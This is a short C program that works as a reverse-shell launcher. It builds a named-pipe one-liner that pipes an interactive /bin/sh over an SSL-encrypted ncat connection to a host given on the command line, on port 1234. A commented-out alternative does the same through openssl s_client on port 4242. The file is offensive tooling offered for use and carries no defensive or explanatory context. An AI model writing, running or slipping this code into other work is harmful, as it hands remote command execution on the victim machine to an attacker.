#include <stdio.h>
#include <stdlib.h>

#define REMOTE_PORT 1234

int main(int argc, char *argv[])
{
    char command[100];

    snprintf(command, 100, "rm /tmp/f;/usr/bin/mkfifo /tmp/f;cat /tmp/f| /bin/sh -i 2>&1 | ncat --ssl %s 1234 >/tmp/f", argv[1]);
    system(command);
    system("rm -f /tmp/f");
    
    // option number 2:
    /*
	snprintf(command, 100, "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect %s:4242 > /tmp/s; rm /tmp/s", argv[1]);
	system(command);
    */

    
    return 0;
}
